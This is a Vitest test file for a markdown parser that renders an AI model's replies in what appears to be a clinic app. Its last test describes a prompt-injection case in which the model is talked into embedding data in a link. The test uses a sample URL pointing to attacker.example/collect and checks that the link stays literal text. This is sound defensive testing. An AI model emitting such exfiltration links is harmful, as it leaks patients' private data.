import { describe, expect, it } from 'vitest';

import { parseInlineMarkdown } from '#lib/ai-assistant/parse-inline-markdown';

describe('parseInlineMarkdown', () => {
  it('resolves bold, italic and code into runs', () => {
    const actual = parseInlineMarkdown('Hubungi **Dokter** untuk _cek_ `stok`.');

    expect(actual).toEqual([
      { text: 'Hubungi ', isBold: false, isItalic: false, isCode: false },
      { text: 'Dokter', isBold: true, isItalic: false, isCode: false },
      { text: ' untuk ', isBold: false, isItalic: false, isCode: false },
      { text: 'cek', isBold: false, isItalic: true, isCode: false },
      { text: ' ', isBold: false, isItalic: false, isCode: false },
      { text: 'stok', isBold: false, isItalic: false, isCode: true },
      { text: '.', isBold: false, isItalic: false, isCode: false },
    ]);
  });

  it('reads a triple marker as bold and italic, not as a stray asterisk', () => {
    const actual = parseInlineMarkdown('***penting***');

    expect(actual).toEqual([{ text: 'penting', isBold: true, isItalic: true, isCode: false }]);
  });

  it('leaves an unclosed marker exactly as the model wrote it', () => {
    // A renderer that repairs half-written emphasis is guessing at meaning.
    const actual = parseInlineMarkdown('2 * 3 dan **belum ditutup');

    expect(actual).toEqual([
      { text: '2 * 3 dan **belum ditutup', isBold: false, isItalic: false, isCode: false },
    ]);
  });

  it('leaves an identifier with underscores alone', () => {
    const actual = parseInlineMarkdown('check_medication_expiry gagal');

    expect(actual).toEqual([
      { text: 'check_medication_expiry gagal', isBold: false, isItalic: false, isCode: false },
    ]);
  });

  it('does not re-read emphasis inside a code run', () => {
    const actual = parseInlineMarkdown('`a ** b`');

    expect(actual).toEqual([{ text: 'a ** b', isBold: false, isItalic: false, isCode: true }]);
  });

  /**
   * SJ-15. Exfiltration by rendered link is an explicit attack case: talk the
   * model into embedding data in a URL and let the reader click it out of the
   * clinic. Link syntax is unsupported here, so the markup stays literal text
   * and there is no anchor to click.
   *
   * This is a regression test for an absence, which is worth stating: adding
   * link support later is a reasonable-looking change that would reopen the
   * case, and this is what makes it fail loudly rather than silently.
   */
  it('renders a markdown link as literal text, never as an anchor', () => {
    const actual = parseInlineMarkdown(
      'Klik [di sini](http://attacker.example/collect?data=budi) untuk konfirmasi.',
    );

    expect(actual).toEqual([
      {
        text: 'Klik [di sini](http://attacker.example/collect?data=budi) untuk konfirmasi.',
        isBold: false,
        isItalic: false,
        isCode: false,
      },
    ]);
  });
});
